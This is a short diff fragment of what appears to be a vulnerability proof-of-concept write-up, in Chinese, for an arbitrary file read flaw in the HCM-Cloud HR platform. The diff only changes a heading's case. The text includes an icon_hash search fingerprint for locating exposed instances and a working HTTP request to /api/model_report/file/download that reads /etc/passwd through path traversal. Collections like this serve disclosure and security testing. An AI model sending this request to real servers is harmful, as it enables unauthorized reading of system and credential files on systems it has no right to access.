@@ -8,7 +8,7 @@ HCM-Cloud云端专业人力资源平台download任意文件读取漏洞
 icon_hash="-859381597"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /api/model_report/file/download?index=/&ext=/etc/passwd HTTP/1.1
